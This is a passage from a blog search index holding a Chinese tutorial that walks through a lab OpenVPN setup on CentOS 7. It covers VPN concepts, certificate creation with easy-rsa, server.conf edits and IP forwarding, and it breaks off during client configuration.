<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>openvpn使用</title>
      <link href="/2024/12/06/openvpn%E4%BD%BF%E7%94%A8/"/>
      <url>/2024/12/06/openvpn%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="openvpn使用"><a href="#openvpn使用" class="headerlink" title="openvpn使用"></a>openvpn使用</h1><p>参考：</p><ul><li><a href="https://blog.csdn.net/u012073617/article/details/143088900">https://blog.csdn.net/u012073617/article/details/143088900</a></li><li><a href="https://blog.csdn.net/XLBYYDS/article/details/141145409">https://blog.csdn.net/XLBYYDS/article/details/141145409</a></li><li><a href="https://www.bilibili.com/video/BV1TW4y117sQ?spm_id_from=333.788.videopod.episodes&amp;vd_source=3ae03810e5d4ba6e6b93c5edd6c76912&amp;p=2">https://www.bilibili.com/video/BV1TW4y117sQ?spm_id_from=333.788.videopod.episodes&amp;vd_source=3ae03810e5d4ba6e6b93c5edd6c76912&amp;p=2</a></li><li><a href="https://www.uqugu.com/blog/article/forward-tun0-to-eth0-using-iptables-nat/">https://www.uqugu.com/blog/article/forward-tun0-to-eth0-using-iptables-nat/</a></li></ul><h2 id="VPN说明"><a href="#VPN说明" class="headerlink" title="VPN说明"></a>VPN说明</h2><h3 id="虚拟专用网络的诞生"><a href="#虚拟专用网络的诞生" class="headerlink" title="虚拟专用网络的诞生"></a>虚拟专用网络的诞生</h3><p>internet不安全，企业专线又太贵，而且不能随地用，不灵活，vpn技术就可以很好的解决这个问题</p><h3 id="虚拟专用网络介绍"><a href="#虚拟专用网络介绍" class="headerlink" title="虚拟专用网络介绍"></a>虚拟专用网络介绍</h3><p>VPN(全称Virtual Private Network)虚拟专用网络，是依靠ISP和其他的NSP，在公共网络中建立专用的数据通信网络的技术;</p><p>可以为企业之间或者个人与企业之间提供安全的数据传输隧道服务。</p><p>在VPN中任意两点之间的连接并没有传统专网所需的端到端的物理链路，而是利用公共网络资源动态组成的;</p><p>可以理解为通过私有的隧道技术在公共数据网络上模拟出来的和专网有同样功能的点到点的专线技术;</p><p>所谓虚拟是指不需要去拉实际的长途物理线路，而是借用了公共Internet网络实现。为了便于理解VPN概念，利用一个网络示意图进行说明:</p><p><img src="/../image/image-20241206093953491.png" alt="image-20241206093953491"></p><p>优点：</p><ul><li>安全性高:</li></ul><p>在远端用户、驻外机构、合作伙伴、供应商与公司总部之间建立可靠的连接，保证数据传输的安全性。</p><p>这对于实现电子商务或金融网络与通讯网络的融合特别重要。</p><ul><li>费用低廉:</li></ul><p>利用公共网络进行信息通讯，企业可以用更低的成本连接远程办事机构、出差人员和业务伙伴。</p><ul><li>支持移动:</li></ul><p>支持出差VPN用户在任何时间、任何地点的移动接入，能够满足不断增长的移动业务需求。</p><ul><li>可扩展性:</li></ul><p>由于VPN为逻辑上的网络，物理网络中增加或修改节点，不影响VPN的部署。</p><h3 id="虚拟专用网络分类"><a href="#虚拟专用网络分类" class="headerlink" title="虚拟专用网络分类"></a>虚拟专用网络分类</h3><p>01 根据VPN建设单位不同进行划分:</p><ul><li>租用运营厂商专线搭建VPN:</li></ul><p>运营商的虚拟专线网络大多数都是使用<code>MPLS VPN</code>;企业通过购买运营商提供的VPN专线服务实现总部和分支机构间的通信需求;VPN网关为运营商所有。</p><p><a href="https://blog.csdn.net/LiMITV/article/details/134961629">https://blog.csdn.net/LiMITV/article/details/134961629</a></p><ul><li>企业内部自建环境搭建VPN:</li></ul><p>企业内部自建基于Internet环境的vpn网络，常见的有IPSec VPN、GRE VPN、L2TP VPN、SSL VPN</p><ol><li><a href="https://blog.csdn.net/weixin_74749868/article/details/1428752557">Ipsec</a></li><li><a href="https://bbs.huaweicloud.com/blogs/378556">GRE VPN</a></li><li><a href="https://blog.csdn.net/2301_77691107/article/details/135113181">L2TP VPN</a></li><li><a href="https://blog.csdn.net/m0_72210904/article/details/136720043?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Ctr-2-136720043-blog-130108206.235%5Ev43%5Epc_blog_bottom_relevance_base5&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Ctr-2-136720043-blog-130108206.235%5Ev43%5Epc_blog_bottom_relevance_base5&utm_relevant_index=5">SSL VPN</a></li></ol><p>企业自己购买VPN网络设备，搭建自己的VPN网络，实现总部和分支机构的通信，或者是出差员工和总部的通信;</p><p>02 根据VPN组网方式不同进行划分:</p><ul><li>远程访问VPN:</li></ul><p>这种方式适用于出差员工拨号接入VPN的方式，员工可以在只要有Internet的地方都可以通过VPN接入访问企业内网资源。最常见类型有:SSL VPN、L2TPVPN</p><ul><li>站点之间VPN:</li></ul><p>这种方式适合用于企业两个局域网互通的情况;例如企业的分支机构访问总部;最常见类型有:MPLS VPN、IPsecVPN</p><p>03 根据VPN工作网络层次进行划分:</p><p>应用层VPN:SSLVPN</p><p>网络层VPN:IPseC VPN、GREVPN</p><p>链路层VPN:L2TP2 VPN、PPTPVPN</p><h3 id="隧道技术说明"><a href="#隧道技术说明" class="headerlink" title="隧道技术说明"></a>隧道技术说明</h3><p>VPN技术的基本原理其实就是用的隧道技术;</p><p>就类似于火车&#x2F;地铁的轨道一样，从A站点到B站点都是直通的，不会堵车。对于乘客而言，就是专车;</p><p>隧道技术其实就是对传输的报文进行封装，利用公网建立专用的数据传输通道，从而完成数据的安全可靠传输;</p><p>省略了nat技术，将需要发送的数据进行封装，通过隧道到对端，对端再解封装。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><table><thead><tr><th>主机</th><th>内网</th><th>外网</th></tr></thead><tbody><tr><td>CentOS 7 (openvpn服务端)</td><td>172.16.30.102</td><td>192.168.174.142</td></tr><tr><td>Windows10(客户端)</td><td>N&#x2F;A</td><td>192.168.177.199</td></tr><tr><td>CentOS7(内网web服务器)</td><td>172.16.30.101</td><td>N&#x2F;A</td></tr></tbody></table><h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><p>准备一台CentOS 7虚拟机，配置双网卡</p><p><img src="/../image/image-20241209154521060.png" alt="image-20241209154521060"></p><p>在CentOS 7上安装一个NetWorkManager，使用nmtui来配置网卡，配置之前的ip a看下网卡名字</p><p><img src="/../image/image-20241209154949210.png" alt="image-20241209154949210"></p><p>可以看到ens36网卡是没有地址的</p><p><img src="/../image/image-20241209154724309.png" alt="image-20241209154724309"></p><p>添加以太网卡，不用配网关</p><p><img src="/../image/image-20241209155229497.png" alt="image-20241209155229497"></p><p>确认即可，然后重启网络服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart network</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20241209155351075.png" alt="image-20241209155351075"></p><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><p>因为vm的虚拟网卡8是nat模式，这里我就直接用本机的环境测试了，ping的通服务端即可，然后这里是ping不通内网网段的</p><p><img src="/../image/image-20241209155905707.png" alt="image-20241209155905707"></p><p><img src="/../image/image-20241209160346347.png" alt="image-20241209160346347"></p><h3 id="web端"><a href="#web端" class="headerlink" title="web端"></a>web端</h3><p>这里可以直接克隆服务端的ctos，然后修改网卡配置</p><p><img src="/../image/image-20241209155959689.png" alt="image-20241209155959689"></p><p>进入系统进行同样的ip配置，记得克隆完不要一起启动，容易导致ip冲突，这里配置完可能需要重启才会修改网卡的ip地址</p><p><img src="/../image/image-20241209161238213.png" alt="image-20241209161238213"></p><p><img src="/../image/image-20241209161304449.png" alt="image-20241209161304449"></p><p>可以看到内网卡是通的，ping不通外网，简易的搭建一个web网站测试一下</p><p><em>记得提前关闭SELinux以及防火墙</em></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer 80 //python2</span><br><span class="line">python -m http.server 80  //python3</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20241209162155064.png" alt="image-20241209162155064"></p><p>在服务端是可以访问的，试试本机的windows环境</p><p><img src="/../image/image-20241209162302478.png" alt="image-20241209162302478"></p><h3 id="建立隧道"><a href="#建立隧道" class="headerlink" title="建立隧道"></a>建立隧道</h3><p><img src="/../image/image-20241209183119777.png" alt="image-20241209183119777"></p><p>数据通过隧道传到openvpn服务端，openvpn服务端转发数据给web服务器，web服务器返回的数据，再通过openvpn服务端经隧道转发给客户端</p><h4 id="操作系统基础优化配置"><a href="#操作系统基础优化配置" class="headerlink" title="操作系统基础优化配置"></a>操作系统基础优化配置</h4><h5 id="系统默认的selinux安全策略优化"><a href="#系统默认的selinux安全策略优化" class="headerlink" title="系统默认的selinux安全策略优化"></a>系统默认的selinux安全策略优化</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 临时关闭SELinux策略</span><br><span class="line">[root@localhost ~]# setenforce 0</span><br><span class="line">[root@localhost ~]# getenforce</span><br><span class="line">Permissive</span><br><span class="line"></span><br><span class="line">#永久关闭SELinux策略</span><br><span class="line">[root@localhost ~]# cat /etc/selinux/config</span><br><span class="line"></span><br><span class="line"># This file controls the state of SELinux on the system.</span><br><span class="line"># SELINUX= can take one of these three values:</span><br><span class="line">#     enforcing - SELinux security policy is enforced.</span><br><span class="line">#     permissive - SELinux prints warnings instead of enforcing.</span><br><span class="line">#     disabled - No SELinux policy is loaded.</span><br><span class="line">SELINUX=enforcing</span><br><span class="line"># SELINUXTYPE= can take one of three two values:</span><br><span class="line">#     targeted - Targeted processes are protected,</span><br><span class="line">#     minimum - Modification of targeted policy. Only selected processes are protected.</span><br><span class="line">#     mls - Multi Level Security protection.</span><br><span class="line">SELINUXTYPE=targeted</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@localhost ~]# sed -i &#x27;7s#enforcing#disabled#g&#x27; /etc/selinux/config</span><br><span class="line">[root@localhost ~]# reboot</span><br></pre></td></tr></table></figure><h5 id="系统默认防火墙福务优化说明"><a href="#系统默认防火墙福务优化说明" class="headerlink" title="系统默认防火墙福务优化说明"></a>系统默认防火墙福务优化说明</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查看防火墙状态</span><br><span class="line">[root@localhost ~]# systemctl status firewalld.service</span><br><span class="line">● firewalld.service</span><br><span class="line">   Loaded: masked (/dev/null; bad)</span><br><span class="line">   Active: inactive (dead)</span><br><span class="line">Warning: firewalld.service changed on disk. Run &#x27;systemctl daemon-reload&#x27; to reload units.</span><br><span class="line">[root@localhost ~]# systemctl is-active firewalld.service</span><br><span class="line">inactive</span><br><span class="line">[root@localhost ~]# systemctl is-enabled firewalld.service</span><br><span class="line">masked</span><br></pre></td></tr></table></figure><h5 id="系统软件下载优化方法"><a href="#系统软件下载优化方法" class="headerlink" title="系统软件下载优化方法"></a>系统软件下载优化方法</h5><blockquote><p><a href="https://youzipii.github.io/2024/12/05/CentOS-%E6%8D%A2%E6%BA%90/">CentOS换源</a></p></blockquote><h5 id="系统基础软件程序下载安装"><a href="#系统基础软件程序下载安装" class="headerlink" title="系统基础软件程序下载安装"></a>系统基础软件程序下载安装</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 企业应用基础工具程序</span><br><span class="line">yum install -y tree nmap lrzsz dos2unix nc lsof wget -y</span><br><span class="line"></span><br><span class="line"># 企业应用扩展程序</span><br><span class="line">yum install -y psmisc net-tools bash-completion vim-enhanced git -y</span><br></pre></td></tr></table></figure><ol><li><p><strong>tree</strong>：</p><ul><li>这是一个递归地列出目录内容的命令行工具，它会以树状图的形式显示目录结构，非常适合查看文件和文件夹的层级关系。</li></ul></li><li><p><strong>nmap</strong>：</p><ul><li>网络映射器（Network Mapper），这是一个开源的网络扫描和安全审计工具，用于发现网络上的设备，检测开放的端口，确定运行在网络设备上的服务及其版本信息，检测潜在的安全漏洞等。</li></ul></li><li><p><strong>lrzsz</strong>：</p><ul><li>这是一个用于在Unix和类Unix系统之间传输文件的工具集，包括<code>rz</code>（接收文件）和<code>sz</code>（发送文件）两个命令。它们通过串行端口或调制解调器进行文件传输。</li></ul></li><li><p><strong>dos2unix</strong>：</p><ul><li>这个工具用于将DOS&#x2F;Windows风格的文本文件格式转换为Unix风格的文本文件格式，主要改变文件中的换行符（CR LF转换为LF）。</li></ul></li><li><p><strong>nc</strong>（netcat）：</p><ul><li>这是一个功能强大的网络工具，用于阅读和写入数据，可用于创建网络连接、监听端口、传输文件等。它常被称为“网络瑞士军刀”。</li></ul></li><li><p><strong>lsof</strong>：</p><ul><li>列出打开的文件（List Open Files），这是一个列出当前系统打开文件的工具。它可以用来查看哪些进程打开了哪些文件，包括常规文件、目录、网络文件系统、流管道等。</li></ul></li><li><p><strong>wget</strong>：</p><ul><li>这是一个非交互式的文件下载工具，可以从网络上下载文件。它支持HTTP、HTTPS和FTP协议，可以递归下载，支持断点续传等。</li></ul></li><li><p><strong>psmisc</strong>：</p><ul><li>这个包提供了一些额外的进程管理工具，最著名的是<code>pstree</code>命令，它可以以树状图的形式显示进程之间的父子关系，以及<code>fuser</code>命令，用于查找访问特定文件、套接字或文件系统的进程。</li></ul></li><li><p><strong>net-tools</strong>：</p><ul><li>这是一个网络工具包，包含了许多用于网络配置和诊断的工具，如<code>ifconfig</code>（用于配置和显示Linux内核中网络接口的网络参数）、<code>netstat</code>（显示网络端口和路由表信息）、<code>route</code>（显示和操作路由表）等。</li></ul></li><li><p><strong>bash-completion</strong>：</p><ul><li>这是一个为Bash shell提供自动补全功能的软件包。它允许用户在输入命令时自动补全命令、文件名、变量名等，提高命令行的效率和易用性。</li></ul></li><li><p><strong>vim-enhanced</strong>：</p><ul><li>这是Vim编辑器的一个增强版，包含了额外的功能和插件，如语法高亮、代码折叠、自动缩进等，使得Vim更加强大和易于使用。</li></ul></li><li><p><strong>git</strong>：</p><ul><li>这是一个分布式版本控制系统，用于跟踪代码变更、协调多人协作开发。Git是目前世界上最流行的版本控制系统，被广泛用于软件开发项目中。</li></ul></li></ol><h4 id="证书制作"><a href="#证书制作" class="headerlink" title="证书制作"></a>证书制作</h4><p>根据之前的openvpn软件工作原理说明，在部署虚拟专用网络服务之前，需要进行相关证书文件制作;</p><p>证书文件制作过程，需要使用到easy-rsa.zip工具进行制作证书。</p><p>制作证书工具下载:<a href="https://github.com/OpenVPN/easy-rsa%E5%B0%86%E8%AF%81%E4%B9%A6%E5%88%B6%E4%BD%9C">https://github.com/OpenVPN/easy-rsa将证书制作</a></p><p>工具上传到主机中:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rz -y </span><br><span class="line">unzip easy-rsa-old-master.zip</span><br><span class="line">cd /easy-rsa-old-master/easy-rsa/2.0/</span><br><span class="line">ls</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20241209171545028.png" alt="image-20241209171545028"></p><p>编辑vars文件，这个文件是一些个人信息，用来表明身份的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 改最底下的这部分就行</span><br><span class="line">export KEY_COUNTRY=&quot;CN&quot;</span><br><span class="line">export KEY_PROVINCE=&quot;FJ&quot;</span><br><span class="line">export KEY_CITY=&quot;FZ&quot;</span><br><span class="line">export KEY_ORG=&quot;XIAO&quot;</span><br><span class="line">export KEY_EMAIL=&quot;123@qq.com&quot;</span><br><span class="line">export KEY_CN=youzipii</span><br><span class="line">export KEY_NAME=youzipii</span><br><span class="line">export KEY_OU=youzipii</span><br><span class="line">export PKCS11_MODULE_PATH=changeme</span><br><span class="line">export PKCS11_PIN=1234</span><br><span class="line"># 快速生效</span><br><span class="line">[root@localhost 2.0]# source ./vars</span><br><span class="line">NOTE: If you run ./clean-all, I will be doing a rm -rf on /root/easy-rsa-old-master/easy-rsa/2.0/keys</span><br><span class="line"># 这里新部署的话是没有的，这里是我们生成的私钥，证书之类的存放目录，我们可以先自己创建一个，注意位置</span><br><span class="line">[root@localhost 2.0]# mkdir keys</span><br><span class="line">[root@localhost 2.0]# ./clean-all</span><br><span class="line">[root@localhost 2.0]# ll keys/</span><br><span class="line">total 4</span><br><span class="line">-rw-r--r--. 1 root root 0 Dec  9 17:24 index.txt</span><br><span class="line">-rw-r--r--. 1 root root 3 Dec  9 17:24 serial</span><br></pre></td></tr></table></figure><h5 id="生产根证书文件和私钥文件"><a href="#生产根证书文件和私钥文件" class="headerlink" title="生产根证书文件和私钥文件"></a>生产根证书文件和私钥文件</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost 2.0]# ./build-ca</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20241209172733407.png" alt="image-20241209172733407"></p><p>这里会让我们填写个人信息，但我们刚刚在vars文件里填写过了，所以直接回车使用默认就行，然后我们可以查看keys目录下有没有新生产的私钥和证书</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost 2.0]# ls -l keys/</span><br><span class="line">total 12</span><br><span class="line">-rw-r--r--. 1 root root 2329 Dec  9 17:27 ca.crt //证书</span><br><span class="line">-rw-------. 1 root root 3272 Dec  9 17:27 ca.key //私钥</span><br><span class="line">-rw-r--r--. 1 root root    0 Dec  9 17:24 index.txt</span><br><span class="line">-rw-r--r--. 1 root root    3 Dec  9 17:24 serial</span><br></pre></td></tr></table></figure><h5 id="生产服务端证书和私钥文件"><a href="#生产服务端证书和私钥文件" class="headerlink" title="生产服务端证书和私钥文件"></a>生产服务端证书和私钥文件</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost 2.0]# ./build-key-server youzipii //youzipii可任意换</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20241209173111638.png" alt="image-20241209173111638"></p><p>同样回车就行，password看这里，我这里默认为空，不影响，最后输两个y确认一下即可，然后去查看keys目录下有没有服务端证书</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost 2.0]# ll keys/</span><br><span class="line">total 48</span><br><span class="line">-rw-r--r--. 1 root root 8061 Dec  9 17:30 01.pem</span><br><span class="line">-rw-r--r--. 1 root root 2329 Dec  9 17:27 ca.crt</span><br><span class="line">-rw-------. 1 root root 3272 Dec  9 17:27 ca.key</span><br><span class="line">-rw-r--r--. 1 root root  114 Dec  9 17:30 index.txt</span><br><span class="line">-rw-r--r--. 1 root root   21 Dec  9 17:30 index.txt.attr</span><br><span class="line">-rw-r--r--. 1 root root    0 Dec  9 17:24 index.txt.old</span><br><span class="line">-rw-r--r--. 1 root root    3 Dec  9 17:30 serial</span><br><span class="line">-rw-r--r--. 1 root root    3 Dec  9 17:24 serial.old</span><br><span class="line">-rw-r--r--. 1 root root 8061 Dec  9 17:30 youzipii.crt //服务端证书</span><br><span class="line">-rw-r--r--. 1 root root 1744 Dec  9 17:30 youzipii.csr //证书请求文件，实验中没有找合法的机构申请，所以csr没什么用这里</span><br><span class="line">-rw-------. 1 root root 3272 Dec  9 17:30 youzipii.key //服务端私钥</span><br></pre></td></tr></table></figure><h5 id="生成客户端证书和密钥文件"><a href="#生成客户端证书和密钥文件" class="headerlink" title="生成客户端证书和密钥文件"></a>生成客户端证书和密钥文件</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost 2.0]# ./build-key client //客户端我就用client了，也是可以随意替换的</span><br></pre></td></tr></table></figure><p>同样是一直回车，最后输入两个y确认即可，然后我们去查看下客户端的证书是否生成</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost 2.0]# ll keys/</span><br><span class="line">total 80</span><br><span class="line">-rw-r--r--. 1 root root 8061 Dec  9 17:30 01.pem</span><br><span class="line">-rw-r--r--. 1 root root 7937 Dec  9 17:36 02.pem</span><br><span class="line">-rw-r--r--. 1 root root 2329 Dec  9 17:27 ca.crt</span><br><span class="line">-rw-------. 1 root root 3272 Dec  9 17:27 ca.key</span><br><span class="line">-rw-r--r--. 1 root root 7937 Dec  9 17:36 client.crt</span><br><span class="line">-rw-r--r--. 1 root root 1744 Dec  9 17:36 client.csr</span><br><span class="line">-rw-------. 1 root root 3268 Dec  9 17:36 client.key</span><br><span class="line">-rw-r--r--. 1 root root  226 Dec  9 17:36 index.txt</span><br><span class="line">-rw-r--r--. 1 root root   21 Dec  9 17:36 index.txt.attr</span><br><span class="line">-rw-r--r--. 1 root root   21 Dec  9 17:30 index.txt.attr.old</span><br><span class="line">-rw-r--r--. 1 root root  114 Dec  9 17:30 index.txt.old</span><br><span class="line">-rw-r--r--. 1 root root    3 Dec  9 17:36 serial</span><br><span class="line">-rw-r--r--. 1 root root    3 Dec  9 17:30 serial.old</span><br><span class="line">-rw-r--r--. 1 root root 8061 Dec  9 17:30 youzipii.crt</span><br><span class="line">-rw-r--r--. 1 root root 1744 Dec  9 17:30 youzipii.csr</span><br><span class="line">-rw-------. 1 root root 3272 Dec  9 17:30 youzipii.key</span><br></pre></td></tr></table></figure><p>可以看到同样生成了</p><h5 id="生成密钥交换文件信息-Diffie-Hellman密钥交换算法"><a href="#生成密钥交换文件信息-Diffie-Hellman密钥交换算法" class="headerlink" title="生成密钥交换文件信息(Diffie-Hellman密钥交换算法)"></a>生成密钥交换文件信息(Diffie-Hellman密钥交换算法)</h5><p>这一步比较耗时间</p><ul><li><a href="https://blog.csdn.net/s2603898260/article/details/112341844">https://blog.csdn.net/s2603898260/article/details/112341844</a></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@localhost 2.0]# ./build-dh </span><br><span class="line">Generating DH parameters, 2048 bit long safe prime, generator 2</span><br><span class="line">This is going to take a long time</span><br><span class="line">........</span><br></pre></td></tr></table></figure><p>这会在keys目录下生成一个密钥文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost 2.0]# ll keys/</span><br><span class="line">total 84</span><br><span class="line">....</span><br><span class="line">-rw-r--r--. 1 root root  424 Dec  9 17:39 dh2048.pem</span><br></pre></td></tr></table></figure><blockquote><p>最终会生成重要的7哥文件，ca2个、server2个、client2个、DH一个。</p></blockquote><h2 id="OpenVPN服务配置"><a href="#OpenVPN服务配置" class="headerlink" title="OpenVPN服务配置"></a>OpenVPN服务配置</h2><p>如果之前换源，一起换了epel源就可以直接在系统里安装下载了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost yum.repos.d]# yum install -y openvpn</span><br><span class="line">阿里云镜像的版本是2.4.12</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20241209175258398.png" alt="image-20241209175258398"></p><p>最好是服务端和客户端版本保持一致</p><p>编写修改openvpn福务配置文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 建立存好openvpn服务加载证文件目录</span><br><span class="line">[root@localhost yum.repos.d]# cd /etc/openvpn/</span><br><span class="line">[root@localhost openvpn]# mkdir keys</span><br><span class="line">[root@localhost openvpn]# ls</span><br><span class="line">client  keys  server</span><br><span class="line"></span><br><span class="line"># 将之前生成的证书文件信息进行拷贝迁移，我这里youzipii指代的是server端</span><br><span class="line">[root@localhost openvpn]# cp /root/easy-rsa-old-master/easy-rsa/2.0/keys/youzipii.crt ./keys/</span><br><span class="line">[root@localhost openvpn]# cp /root/easy-rsa-old-master/easy-rsa/2.0/keys/youzipii.key ./keys/</span><br><span class="line">[root@localhost openvpn]# cp /root/easy-rsa-old-master/easy-rsa/2.0/keys/ca.crt ./keys/</span><br><span class="line">[root@localhost openvpn]# cp /root/easy-rsa-old-master/easy-rsa/2.0/keys/dh2048.pem ./keys/</span><br><span class="line">[root@localhost openvpn]# ll keys/</span><br><span class="line">total 20</span><br><span class="line">-rw-r--r--. 1 root root 2329 Dec  9 17:56 ca.crt</span><br><span class="line">-rw-r--r--. 1 root root  424 Dec  9 17:56 dh2048.pem</span><br><span class="line">-rw-r--r--. 1 root root 8061 Dec  9 17:56 youzipii.crt</span><br><span class="line">-rw-------. 1 root root 3272 Dec  9 17:56 youzipii.key</span><br><span class="line"></span><br><span class="line"># 拷贝openvpn服务模板配置文件</span><br><span class="line">[root@localhost openvpn]# pwd //别拷到keys里了</span><br><span class="line">/etc/openvpn</span><br><span class="line">[root@localhost openvpn]# cp /usr/share/doc/openvpn-2.4.12/sample/sample-config-files/server.conf ./</span><br><span class="line">[root@localhost openvpn]# ll server.conf </span><br><span class="line">-rw-r--r--. 1 root root 10784 Dec  9 17:59 server.conf</span><br></pre></td></tr></table></figure><h3 id="编辑openvpn服务模板配置文件"><a href="#编辑openvpn服务模板配置文件" class="headerlink" title="编辑openvpn服务模板配置文件"></a>编辑openvpn服务模板配置文件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost openvpn]# vim server.conf</span><br><span class="line">78 ca keys/ca.crt</span><br><span class="line">79 cert keys/youzipii.crt</span><br><span class="line">80 key keys/youzipii.key </span><br><span class="line">85 dh keys/dh2048.pem</span><br><span class="line">更改配置加载的证书文件路径信息</span><br><span class="line">101 server 10.8.0.0 255.255.255.0</span><br><span class="line">当vpn拨号建立连接成功后，会生成的隧道连接网段信息</span><br><span class="line">143 push &quot;route 10.8.0.0 255.255.255.0</span><br><span class="line">144 push &quot;route 172.16.30.0 255.255.255.0</span><br><span class="line">表示路由信息推送，可以让拨号的客户端主机路由表中，添加以上两个路由条目信息;最终实现和企业私网以及vpn隧道私网建立通信</span><br><span class="line">246 tls-auth keys/ta.key 0</span><br><span class="line">表示拒绝服务攻击的道书</span><br><span class="line">254 cipher AES-256-GCM</span><br><span class="line">表示设置数据传输的加密模式，从2.4版本之后不能使用CBC模式了，需要改为GCM</span><br></pre></td></tr></table></figure><p><em>tips: 命令行模式下&#x2F;+要搜索的字符串，回车后可以快速查询</em></p><p><img src="/../image/image-20241209180339766.png" alt="image-20241209180339766"></p><p>将相关配置文件替换为自己生成的证书和密钥</p><p><em>tips: vim 命令行模式下 :set nu可以显示行号</em></p><p><img src="/../image/image-20241209180145687.png" alt="image-20241209180145687"></p><p>自定义隧道地址，我这里用默认的10.8.0.0</p><p><img src="/../image/image-20241209180527247.png" alt="image-20241209180527247"></p><p>添加路由，我们可以到客户端看看，路由表是没有这条的</p><p><em>tips:yy复制，p粘贴</em></p><p><img src="/../image/image-20241209182205906.png" alt="image-20241209182205906"></p><p><img src="/../image/image-20241209181809694.png" alt="image-20241209181809694"></p><p>这里还有一个用来抵御DOS攻击的参数，这个文件目前</p><p><img src="/../image/image-20241209181947178.png" alt="image-20241209181947178"></p><p>最后2.4版本后加密模式不能用CBC，得改成GCM</p><p><img src="/../image/image-20241209182324583.png" alt="image-20241209182324583"></p><p>保存并退出，然后设置开启openvpn服务器路由转发</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 启用路由转发功能</span><br><span class="line">[root@localhost openvpn]# echo &quot;net.ipv4.ip_forward=1&quot; &gt;&gt; /etc/sysctl.conf</span><br><span class="line"></span><br><span class="line"># 生效指令</span><br><span class="line">[root@localhost openvpn]# sysctl -p</span><br><span class="line">net.ipv4.ip_forward = 1</span><br></pre></td></tr></table></figure><p>建立ta.key文件,记得修改配置文件，不然启动不了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost keys]# pwd</span><br><span class="line">/etc/openvpn/keys</span><br><span class="line">[root@localhost keys]# openvpn --genkey --secret ta.key</span><br><span class="line">[root@localhost keys]# ls</span><br><span class="line">ca.crt  dh2048.pem  ta.key  youzipii.crt  youzipii.key</span><br></pre></td></tr></table></figure><p>遇到报错了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost openvpn]# systemctl status openvpn@server.service</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20241209184715499.png" alt="image-20241209184715499"></p><p>刚刚生成ta.key没有配置进去</p><p>启动运行openvpn服务程序</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost openvpn]# openvpn --daemon --config server.conf</span><br><span class="line">[root@localhost openvpn]# netstat -lntup | grep 1194</span><br><span class="line">udp        0      0 0.0.0.0:1194            0.0.0.0:*                           55134/openvpn </span><br></pre></td></tr></table></figure><p><img src="/../image/image-20241209184617160.png" alt="image-20241209184617160"></p><p>因为第二天重启了虚拟机，临时配置的selinux策略恢复了，openvpn挂了</p><p><img src="/../image/image-20241210200138723.png" alt="image-20241210200138723"></p><p>重新配置一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setenforce 0 </span><br><span class="line">getenforce</span><br></pre></td></tr></table></figure><h2 id="OpenVPN客户端"><a href="#OpenVPN客户端" class="headerlink" title="OpenVPN客户端"></a>OpenVPN客户端</h2><h3 id="编写配置openvpn客户但程序配置文件"><a href="#编写配置openvpn客户但程序配置文件" class="headerlink" title="编写配置openvpn客户但程序配置文件"></a>编写配置openvpn客户但程序配置文件</h3><p>先在服务端创建一个用于汇总客户端信息的文件夹</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# mkdir client</span><br><span class="line">[root@localhost client]# pwd</span><br><span class="line">/root/client</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">复制客户端文件</span></span><br><span class="line">[root@localhost client]# cp /usr/share/doc/openvpn-2.4.12/sample/sample-config-files/client.conf /root/client//</span><br><span class="line">[root@localhost client]# ls</span><br><span class="line">client.conf</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编辑配置文件</span></span><br><span class="line">[root@localhost client]# vim client.conf</span><br></pre></td></tr></table></figure><p>添加外网网卡的IP</p><p><img src="/../image/image-20241210202551776.png" alt="image-20241210202551776"></p><p>修改加密方式</p><p><img src="/../image/image-20241210202639524.png" alt="image-20241210202639524"></p><h3 id="导出保存openvpn客户端证书相关文件"><a href="#导出保存openvpn客户端证书相关文件" class="headerlink" 